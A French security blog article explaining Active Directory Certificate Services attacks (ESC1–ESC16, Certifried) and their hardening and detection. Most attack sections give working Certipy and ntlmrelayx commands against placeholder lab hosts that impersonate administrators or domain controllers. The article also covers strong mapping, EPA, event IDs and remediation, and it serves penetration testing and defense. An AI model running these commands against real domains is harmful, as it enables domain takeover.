> **TL;DR** — ADCS, c'est la PKI de l'entreprise dans AD. Toute la surface d'attaque tient en une phrase : si on obtient un certificat au nom d'un compte privilégié, **PKINIT transforme ce certificat en TGT** — donc en identité. Les défauts de config (étiquetés *ESC*) ouvrent cette porte : un template qui laisse choisir le sujet (ESC1), des EKU trop larges (ESC2/ESC3), des ACL faibles (ESC4/ESC5/ESC7), un flag CA dangereux (ESC6), ou un relais NTLM vers l'enrôlement web (ESC8). On déroule ESC1 à ESC8 avec **Certipy** (`find` / `req` / `auth`), on survole ESC9 à ESC16 et Certifried (CVE-2022-26923), puis on durcit : **strong mapping (KB5014754 + extension SID)** et **EPA Required** sur le web (passer en HTTPS ne suffit pas sans EPA).
{: .prompt-info }

| | |
|---|---|
| **Composant** | Active Directory Certificate Services (AD CS), la PKI d'entreprise |
| **Rôle dans AD** | Émettre et gérer les certificats X.509 ; authentifier par certificat |
| **Le point clé** | PKINIT : un certificat → un TGT (donc une identité) |
| **Ce qu'on abuse** | Sujet choisi par le demandeur, EKU d'auth, ACL template/CA, flag `EDITF_ATTRIBUTESUBJECTALTNAME2`, enrôlement web NTLM sans EPA |
| **Attaques** | ESC1→ESC8 en détail, ESC9→ESC16 + Certifried en survol |

Le papier fondateur, c'est *Certified Pre-Owned: Abusing Active Directory Certificate Services* (Will Schroeder et Lee Chagolla-Christensen, SpecterOps, juin 2021) : il définit ESC1 à ESC8. L'outil de référence côté offensif, c'est **Certipy** (Oliver Lyak / ly4k), qui couvre aujourd'hui ESC1 à ESC16. C'est le pendant ADCS de mon article sur [Kerberos](/posts/kerberos/) (PKINIT y mène tout droit) et ça recoupe celui sur [NTLM](/posts/ntlm/) (ESC8 est un relais NTLM).

## 1. Comment ça marche

### 1.1 PKI, CA et templates

AD CS, c'est une **PKI intégrée à AD** : un rôle serveur qui émet et gère des certificats X.509. L'**Enterprise CA** (par opposition à la Standalone CA) est jointe au domaine et publie ses modèles dans la partition Configuration (`CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,…`).

Un **template** définit trois choses, et ces trois choses décident de presque toutes les attaques :

- **qui peut s'enrôler** (l'ACL d'enrollment) ;
- **comment le sujet est fixé** : soit par AD à partir du compte demandeur, soit **fourni par le demandeur** — c'est la source directe d'ESC1 ;
- **les EKU** (usages) et les **flags** d'enrollment.

### 1.2 Les EKU : ce qui rend un certificat « authentifiant »

Les **EKU** (Extended Key Usage) sont des OID qui disent à quoi sert le certificat. Ceux qui permettent de s'authentifier — donc d'abuser :

```text
Client Authentication        1.3.6.1.5.5.7.3.2
PKINIT Client Authentication 1.3.6.1.5.2.3.4
Smart Card Logon             1.3.6.1.4.1.311.20.2.2
Any Purpose                  2.5.29.37.0   (ou EKU vide)
Certificate Request Agent    1.3.6.1.4.1.311.20.2.1
```

Un template qui porte un de ces EKU et laisse choisir le sujet est exploitable. `Any Purpose` et `Certificate Request Agent` sont au cœur d'ESC2 et ESC3.

### 1.3 Enrôlement et PKINIT

On demande un certificat par plusieurs canaux : DCOM/RPC (MS-ICPR, via `certreq`), l'**interface web** (certsrv, MS-WCCE sur HTTP), ou CES/NDES. C'est cette porte web qu'on relaie en ESC8.

Le maillon qui transforme « j'ai un certificat » en « je suis ce compte », c'est **PKINIT** : l'extension Kerberos qui délivre un **TGT à partir d'un certificat** (on prouve son identité par clé publique, pas par mot de passe). C'est le lien direct avec [Kerberos](/posts/kerberos/) : une fois le TGT en main, on est dans le flux Kerberos normal (et Certipy renvoie le hash NT au passage). Quand PKINIT n'est pas disponible, il reste **Schannel** (auth par certificat sur TLS, utilisé par ESC10 case 2 et ESC15).

## 2. Les attaques ESC1 à ESC8

> **Autorisation** — tout ça se fait seulement sur un périmètre autorisé (mission sous mandat ou lab à soi). Émettre un certificat au nom d'un admin sur une PKI qui n'est pas la sienne, c'est une vraie compromission, pas un exercice. Les commandes sont là pour comprendre le défaut, pas pour lancer à l'aveugle.
{: .prompt-warning }

Le workflow Certipy est presque toujours le même :

```bash
# Découverte des templates/CA vulnérables (JSON + sortie lisible)
certipy find -u user@corp.local -p 'Password1' -dc-ip 10.10.10.10 -vulnerable -stdout
# → liste les ESCx détectés, par template et par CA

# Après obtention d'un PFX : authentification (PKINIT → TGT + hash NT)
certipy auth -pfx admin.pfx -dc-ip 10.10.10.10
```

### 2.1 ESC1 : le template laisse choisir le SAN

**Principe.** Le template cumule trois faiblesses : un EKU d'auth (Client Auth ou Any Purpose), le flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (**le demandeur fournit le `subjectAltName`**), et un enrollment ouvert aux comptes peu privilégiés. On demande donc un certificat en mettant le **UPN d'un admin** dans le SAN : la CA l'émet tel quel. C'est le cas le plus fréquent.

**Exploitation.**

```bash
# Demande d'un cert avec le UPN d'un admin dans le SAN (-upn), -target = FQDN de la CA
certipy req -u user@corp.local -p 'Password1' -dc-ip 10.10.10.10 \
  -target adcs.corp.local -ca 'CORP-CA' -template 'VulnTemplate' -upn 'administrator@corp.local'
# → administrator.pfx

# Variante : usurper une machine via son DNS plutôt qu'un UPN
certipy req -u user@corp.local -p 'Password1' -dc-ip 10.10.10.10 \
  -target adcs.corp.local -ca 'CORP-CA' -template 'VulnTemplate' -dns 'dc01.corp.local'

# Puis Pass-the-Certificate
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10
```

Si Certipy renvoie une erreur « Object SID mismatch », on ajoute `-sid` avec le SID de la cible : c'est la conséquence directe du *strong mapping* (extension SID, §4). Depuis l'enforcement, ce `-sid` est quasi systématique.

**Impact.** On usurpe n'importe quel compte, Domain Admin compris → domaine compromis à partir d'un simple compte de domaine.

### 2.2 ESC2 : Any Purpose EKU

Le template porte l'EKU **Any Purpose** (`2.5.29.37.0`) ou **aucun EKU**. Le certificat sert alors à tout, auth comprise. Pas de commande propre à ESC2 : sans contrôle du sujet, l'exploitation rejoint celle de l'agent d'enrôlement (ESC3), le cert Any Purpose faisant office de certificat d'agent.

### 2.3 ESC3 : Certificate Request Agent EKU

Le template porte l'EKU **Certificate Request Agent** (`1.3.6.1.4.1.311.20.2.1`), qui autorise à demander un certificat **au nom d'un autre compte**. On récupère d'abord le certificat d'agent, puis on s'enrôle en tant qu'admin avec.

```bash
# 1. Obtenir le certificat d'agent d'enrôlement
certipy req -u user@corp.local -p 'Password1' -dc-ip 10.10.10.10 \
  -target adcs.corp.local -ca 'CORP-CA' -template 'EnrollmentAgent'

# 2. Demander un cert "User" au nom de l'admin, avec le PFX d'agent
certipy req -u user@corp.local -p 'Password1' -dc-ip 10.10.10.10 \
  -target adcs.corp.local -ca 'CORP-CA' -template 'User' \
  -on-behalf-of 'corp\administrator' -pfx 'user.pfx'
```

Le template visé en étape 2 doit permettre la Client Authentication. Résultat : un cert pour l'admin → PKINIT → compromission, sans jamais toucher à son mot de passe.

### 2.4 ESC4 : ACL faibles sur un template

On a des droits d'écriture (`WriteOwner` / `WriteDacl` / `GenericWrite` / `GenericAll`) sur l'**objet template** lui-même. On le **reconfigure** pour le rendre vulnérable (typiquement en ESC1), on l'exploite, puis on **restaure** sa config d'origine.

```bash
# Rendre le template vulnérable (config par défaut permissive), puis exploiter en ESC1
certipy template -u user@corp.local -p 'Password1' -template 'VulnTemplate' -write-default-configuration
# → enchaîner avec un certipy req type ESC1, puis restaurer la configuration d'origine
```

En mission, bien restaurer pour ne pas laisser le template exposé.

### 2.5 ESC5 : ACL faibles sur d'autres objets PKI

Le contrôle ne porte pas sur un template mais sur un autre objet de la PKI : l'objet ordinateur du serveur CA, le conteneur `CN=Public Key Services`, les objets CA eux-mêmes. En maîtrisant l'un d'eux, on compromet toute la PKI par un chemin détourné — souvent invisible si on ne regarde que les templates. L'analyse part de `certipy find` et de la carto des ACL (BloodHound remonte ces chemins) ; la remédiation est la même qu'en ESC4/ESC7 : durcir les ACL.

### 2.6 ESC6 : EDITF_ATTRIBUTESUBJECTALTNAME2

Le flag **`EDITF_ATTRIBUTESUBJECTALTNAME2`** est activé **sur la CA**. Du coup **n'importe quel** template, même le `User` standard, accepte un SAN fourni par le demandeur via l'attribut de requête. C'est ESC1 généralisé à toute la CA, sans avoir besoin d'un template vulnérable. Un seul flag mal positionné suffit — à surveiller de près côté défense.

```bash
# Détection : certipy find remonte "User Specified SAN : Enabled"
certipy find -u user@corp.local -p 'Password1' -dc-ip 10.10.10.10 -stdout
# Côté Windows : certutil -getreg policy\EditFlags

# Exploitation comme ESC1, mais sur un template standard
certipy req -u user@corp.local -p 'Password1' -dc-ip 10.10.10.10 \
  -target adcs.corp.local -ca 'CORP-CA' -template 'User' -upn 'administrator@corp.local'
```

Comme pour ESC1, depuis le correctif de mai 2022 (extension SID / CVE-2022-26923), l'exploitation peut demander `-sid`. Impact : usurpation d'un admin via n'importe quel template émis par la CA → domaine compromis.

### 2.7 ESC7 : ACL faibles sur la CA

On détient le droit `ManageCA` et/ou `ManageCertificates` sur la CA. `ManageCA` permet d'activer `EDITF_ATTRIBUTESUBJECTALTNAME2` (→ ESC6), ou de s'ajouter comme *Officer* pour approuver des requêtes en attente et activer le template `SubCA`.

```bash
# S'ajouter comme officer, activer le template SubCA
certipy ca -u user@corp.local -p 'Password1' -ca 'CORP-CA' -add-officer user
certipy ca -u user@corp.local -p 'Password1' -ca 'CORP-CA' -enable-template 'SubCA'

# Soumettre une requête SubCA (échoue → renvoie un request id), puis approuver et récupérer
certipy req -u user@corp.local -p 'Password1' -target adcs.corp.local -ca 'CORP-CA' -template 'SubCA'
certipy ca  -u user@corp.local -p 'Password1' -ca 'CORP-CA' -issue-request <ID>
certipy req -u user@corp.local -p 'Password1' -target adcs.corp.local -ca 'CORP-CA' -retrieve <ID>
```

Résultat : contrôle effectif de l'émission — on se délivre un certificat privilégié en contournant l'approbation normale.

### 2.8 ESC8 : relais NTLM vers l'enrôlement web

L'interface **web enrollment** d'AD CS (certsrv, CES, NDES, via MS-WCCE sur HTTP) accepte l'authentification NTLM et **n'impose pas l'EPA**. On **relaie** une auth NTLM — typiquement celle d'un **DC coercé** — vers la CA, et on récupère un certificat au nom du compte relayé. C'est le relais ADCS de référence, popularisé par les travaux de dirkjanm (PetitPotam → ADCS). Ça recoupe directement l'article [NTLM](/posts/ntlm/).

**Prérequis.** Une coercition (PrinterBug, **PetitPotam**, PrivExchange, Coercer) qui force un compte à s'authentifier vers notre hôte, un template qui autorise l'auth (User/Machine/DomainController), et un enrollment peu privilégié. Pour viser le domaine, on coerce un compte privilégié (un DC, Exchange).

**Exploitation.** Deux syntaxes selon la version de l'outil.

```bash
# Historique : relais via ntlmrelayx (Impacket), endpoint HTTP
ntlmrelayx -t http://pki.corp.local/certsrv/certfnsh.asp --adcs --template 'DomainController'
# → PFX du compte relayé obtenu dès qu'une coercition tombe

# Certipy v5, relais natif, HTTP ET HTTPS (alias binaire : certipy-ad relay)
certipy relay -target http://10.0.0.50      # ESC8 sur HTTP
certipy relay -target https://10.0.0.50     # ESC8 sur HTTPS (natif en v5)
```

Découverte préalable :

```bash
certipy find -u user@corp.local -p 'Password1' -dc-ip 10.10.10.10 -stdout | grep -B20 ESC8
```

Un `-template` vide laisse Certipy choisir Machine ou User selon que le compte relayé finit par `$`.

**Impact.** PFX du DC → Pass-the-Certificate → TGT du DC → DCSync → domaine. C'est une des chaînes ADCS les plus courtes vers le domaine, et le relais HTTPS natif de Certipy v5 l'a remise en avant (§4).

## 3. Au-delà d'ESC8 : ESC9 à ESC16 et Certifried

Les labels suivants couvrent le reste ; ils sont couverts par Certipy et documentés sur thehacker.recipes. En survol :

- **ESC9 : No Security Extension.** Le flag `CT_FLAG_NO_SECURITY_EXTENSION` empêche l'ajout de l'extension SID au certificat. Combiné à un mapping faible côté DC et à un `GenericWrite` sur un compte, il permet l'usurpation via changement de UPN (Certipy `shadow auto` + `account update` pour passer le UPN à celui de la cible, puis `req`, puis restauration).
- **ESC10 : Weak Certificate Mapping.** Mapping faible côté DC (`StrongCertificateBindingEnforcement = 0`, case 1) ou `CertificateMappingMethods = 0x4` / UPN only (case 2, où la cible n'a pas de UPN, par exemple un compte machine/DC, exploité via **Schannel** et `-ldap-shell`).
- **ESC11 : relais vers RPC (MS-ICPR).** L'endpoint RPC d'enrôlement n'impose pas le packet privacy → relais NTLM possible (`ntlmrelayx -t rpc://… -rpc-mode ICPR -icpr-ca-name …`). Recherche originale : Compass Security.
- **ESC12 : shell sur CA avec YubiHSM.** Mot de passe de l'HSM en clair dans le registre → export de la clé CA.
- **ESC13 : Issuance Policy liée à un groupe.** Un template dont la issuance policy est reliée via `msDS-OIDToGroupLink` à un groupe privilégié confère l'appartenance (SID injecté dans le PAC). Recherche : Jonas Bülow Knudsen (SpecterOps).
- **ESC14 : Weak Explicit Mapping.** `altSecurityIdentities` contient un mapping explicite faible (ou l'attaquant peut l'écrire).
- **ESC15 : Arbitrary Application Policy (CVE-2024-49019, « EKUwu »).** Sur un template v1 autorisant le SAN, les *application policies* fournies par le demandeur **écrasent les EKU** du template (`certipy req --application-policies …`). L'auth via application policy ne fonctionne qu'en **Schannel** (pas PKINIT) ; injecter Certificate Request Agent enchaîne vers ESC3. **Patché** sur les systèmes à jour. Recherche : TrustedSec.
- **ESC16 : Security Extension désactivée au niveau CA.** La CA désactive l'OID `1.3.6.1.4.1.311.25.2` (extension SID) via `policy\DisableExtensionList` → comportement ESC9 pour tous les templates. Non exploitable sous `StrongCertificateBindingEnforcement = 2`.

**CVE-2022-26923, « Certifried ».** Un utilisateur qui crée un compte machine peut écrire ses `dNSHostName` et `servicePrincipalName`. En effaçant d'abord les SPN (pour éviter le contrôle de contrainte), on fixe `dNSHostName` au nom d'un DC, puis on demande un certificat via le template **Machine** : la CA identifie la machine par son `dNSHostName` et émet un certificat **pour le DC**.

```bash
# Création du compte machine avec le dNSHostName d'un DC, puis demande via le template Machine
certipy account create -u user@corp.local -p 'Password1' -user 'EVIL$' -pass 'Evil123!' -dns 'dc01.corp.local'
certipy req -u 'EVIL$'@corp.local -p 'Evil123!' -dc-ip 10.10.10.10 \
  -target adcs.corp.local -ca 'CORP-CA' -template 'Machine'
```

Le test patché/non patché : si Certipy affiche `Certificate object SID is […]` (objectSid présent), le correctif est appliqué. Correctif Microsoft de **mai 2022** ; la mitigation complète exige de patcher **le KDC et le serveur CA**, et de ramener `MachineAccountQuota` à 0.

## 4. Durcissement

Le détail mesure par mesure est dans le tableau de recommandations (§6). Avant ça, deux points à détailler, parce qu'ils sont presque toujours mal compris.

**Strong mapping (KB5014754 + extension SID).** Le correctif de fond fait ajouter et vérifier par les DC l'**extension SID** `szOID_NTDS_CA_SECURITY_EXT` (OID `1.3.6.1.4.1.311.25.2`), qui lie fortement le certificat à l'objet AD. La clé `StrongCertificateBindingEnforcement` du KDC prend trois valeurs : **0 (Disabled)**, **1 (Compatibility)** et **2 (Full Enforcement)**. À `2`, tout mapping faible ou absent est rejeté. C'est ce qui casse ESC9/ESC10/ESC16 et impose le `-sid` de Certipy pour ESC1/ESC6.

**EPA sur l'enrôlement web (ESC8).** **Passer l'enrôlement web en HTTPS ne suffit pas.** Historiquement, IIS n'imposait pas l'EPA par défaut, donc un endpoint **HTTPS restait relayable** tant que l'EPA n'était pas explicitement positionnée en *Required* (IIS Extended Protection). C'est le passage à EPA = Required qui lie l'authentification au canal TLS et coupe le relais, pas le simple chiffrement.

### Actualité (2024-2026)

- **Enforcement de KB5014754.** D'après Microsoft, le déploiement initial date du **10 mai 2022** (mode Compatibility par défaut), avec un jalon de durcissement en **novembre 2023**. Depuis la mise à jour du **11 février 2025**, un DC dont la clé `StrongCertificateBindingEnforcement` n'est pas configurée bascule en **Full Enforcement** (rejet des mappings faibles ou absents) ; un DC qui a explicitement la valeur `1` (Compatibility) reste, lui, en Compatibility. La mise à jour du **9 septembre 2025** met fin à la possibilité de revenir en mode Compatibility : la valeur `StrongCertificateBindingEnforcement` ne serait **plus prise en charge**, et le strong mapping s'imposerait de fait pour toute authentification par certificat, d'où le recours quasi systématique au flag `-sid` de Certipy. Une *known issue* a par ailleurs été ajoutée le **29 juillet 2025** (une GPO interférant avec les mappings basés sur le nom). *Comme pour tout calendrier Microsoft, vérifier l'état exact sur la KB en vigueur et sur l'environnement audité.*
- **ESC8 nouvelle génération (relais HTTPS).** D'après Compass Security (2025), comme IIS n'impose pas l'EPA par défaut sur ces endpoints, le simple passage en HTTPS ne protège pas : un endpoint HTTPS reste relayable tant que l'EPA n'est pas explicitement en *Required*. **Certipy v5** ajoute le relais HTTPS natif et la détection de l'enforcement du channel binding. L'outil **RelayInformer** (SpecterOps, 2025) énumère l'enforcement EPA sur les endpoints HTTPS et MSSQL. Côté défense : désactiver HTTP ne suffit plus, il faut EPA sur HTTPS, et **NDES/SCCM relèvent de la même classe d'attaque**.

## 5. Détection

Côté CA et côté KDC, l'audit tourne autour de trois Events (audit AD CS activé via `certutil -setreg CA\AuditFilter 127` + la policy *Audit Certification Services*) :

| Indicateur | Event ID | Signal |
|---|---|---|
| Requête de certificat reçue | **4886** | « Certificate Services received a certificate request » |
| Certificat émis | **4887** | « approved a certificate request and issued a certificate » : repère un SAN inhabituel, un demandeur ≠ sujet (ESC1/ESC6/ESC8) |
| TGT demandé par certificat | **4768** | Champs *Certificate Information* renseignés = auth **PKINIT** ; un 4768 avec cert pour un compte à privilèges = signal d'abus après ESC1 |

Les signaux qui comptent : discordance **demandeur vs SAN** (un certificat avec un SAN UPN admin émis à un compte lambda), `objectSid` absent (templates ESC9/ESC16), binds Schannel inhabituels, et émission anormale juste avant un 4768 PKINIT sur un compte sensible. BloodHound (edges ADCS) et Microsoft Defender for Identity remontent les chemins. Côté MITRE ATT&CK, c'est la technique **T1649** (*Steal or Forge Authentication Certificates*).

## 6. Recommandations

| Mesure | Ce que ça bloque |
|---|---|
| **Retirer `ENROLLEE_SUPPLIES_SUBJECT`** sur les templates d'auth + approbation manuelle sur les templates sensibles | ESC1 |
| **Désactiver `EDITF_ATTRIBUTESUBJECTALTNAME2`** sur la CA | ESC6 (SAN arbitraire généralisé) |
| **EPA = Required** sur l'enrôlement web (HTTPS + Extended Protection), NTLM désactivé, coercition corrigée | ESC8 (et ESC11 côté RPC via packet privacy) |
| **KB5014754 + `StrongCertificateBindingEnforcement = 2`** (extension SID, strong mapping) | ESC9 / ESC10 / ESC16, mappings faibles |
| **Retirer les EKU dangereux** (Any Purpose, Certificate Request Agent), restreindre les enrollment agents | ESC2 / ESC3 |
| **Durcir les ACL** sur templates, objets PKI et CA (pas de `WriteDacl` / `ManageCA` aux non-admins) | ESC4 / ESC5 / ESC7 |
| **Patch mai 2022 (KDC + CA)** et **`MachineAccountQuota = 0`** | CVE-2022-26923 (Certifried) |
| Appliquer **CVE-2024-49019**, retirer/mettre à jour les templates v1 à SAN | ESC15 (EKUwu) |
| Supprimer les `msDS-OIDToGroupLink` vers des groupes privilégiés, nettoyer `altSecurityIdentities` | ESC13 / ESC14 |
| **Audit CA activé** (4886/4887) + alerting sur SAN/demandeur discordants et 4768 PKINIT sensibles | Détection ESC1/ESC6/ESC8 |

Si tu ne devais retenir que l'essentiel : **`ENROLLEE_SUPPLIES_SUBJECT` et `EDITF_ATTRIBUTESUBJECTALTNAME2` hors des templates sensibles**, **EPA = Required** sur le web, **strong mapping à `2`**, et **`MachineAccountQuota` à 0**. Ces quatre-là ferment la grande majorité des chemins vus plus haut.
